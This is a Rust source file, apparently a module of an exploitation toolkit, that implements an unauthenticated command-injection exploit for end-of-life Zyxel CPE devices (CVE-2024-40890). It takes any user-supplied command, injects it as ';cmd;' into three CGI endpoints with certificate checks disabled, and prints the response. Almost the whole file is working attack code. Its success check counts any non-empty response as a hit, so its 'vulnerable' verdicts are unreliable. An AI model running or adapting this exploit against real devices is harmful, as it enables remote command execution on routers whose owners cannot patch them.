use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};
use urlencoding;

/// Zyxel CPE Unauthenticated Command Injection (CVE-2024-40890)
/// 
/// Exploits HTTP-based command injection in legacy Zyxel CPE devices.
/// This is an unauthenticated vulnerability affecting multiple EOL models.
/// 
/// Note: Zyxel has confirmed no patches will be released (EOL devices).

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("http://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    println!("{} This exploit targets EOL Zyxel CPE devices.", "[!]".yellow().bold());
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    println!("{} Sending unauthenticated command injection...", "[*]".blue());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(15))
        .build()?;
    
    // CVE-2024-40890 injection point
    // The vulnerability is in the HTTP interface command handling
    // Multiple injection vectors exist in various CGI endpoints
    
    let injection = format!(";{};", cmd);
    let encoded_injection = urlencoding::encode(&injection);
    
    // Try various known vulnerable endpoints with URL-encoded params
    let urls = vec![
        format!("{}/cgi-bin/ViewLog.cgi?remote_host={}", 
                base_url.trim_end_matches('/'), encoded_injection),
        format!("{}/cgi-bin/ping.cgi?host={}", 
                base_url.trim_end_matches('/'), encoded_injection),
        format!("{}/boaform/admin/formPing?target={}&waession=", 
                base_url.trim_end_matches('/'), encoded_injection),
    ];
    
    let mut found_vuln = false;
    
    for url in &urls {
        println!("{} Trying: {}", "[*]".dimmed(), url);
        
        let res = client.get(url)
            .send()
            .await;
            
        match res {
            Ok(r) => {
                let status = r.status();
                let text = r.text().await.unwrap_or_default();
                
                // Check for signs of command execution
                if text.contains("uid=") || text.contains("root") || !text.is_empty() {
                    println!("{} Potential command injection at {}!", "[+]".green().bold(), url);
                    println!("{} Response excerpt: {}", "[*]".blue(), text.chars().take(300).collect::<String>());
                    found_vuln = true;
                    break;
                } else if status.is_success() {
                    println!("{} Endpoint responded (HTTP {}).", "[*]".yellow(), status);
                }
            },
            Err(e) => {
                println!("{} Failed: {}", "[*]".dimmed(), e);
            }
        }
    }
    
    if found_vuln {
        println!();
        println!("{} Device appears VULNERABLE to CVE-2024-40890!", "[VULN]".red().bold());
    } else {
        println!();
        println!("{} Could not confirm vulnerability.", "[*]".yellow());
        println!("{} Target may be patched, not a Zyxel CPE, or uses different endpoints.", "[*]".dimmed());
    }
    
    println!();
    println!("{} Affected EOL models include various Zyxel CPE devices.", "[*]".cyan());
    println!("{} No patches available - consider replacing the device.", "[!]".yellow());

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Zyxel CPE Unauth Command Injection (CVE-2024-40890)    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
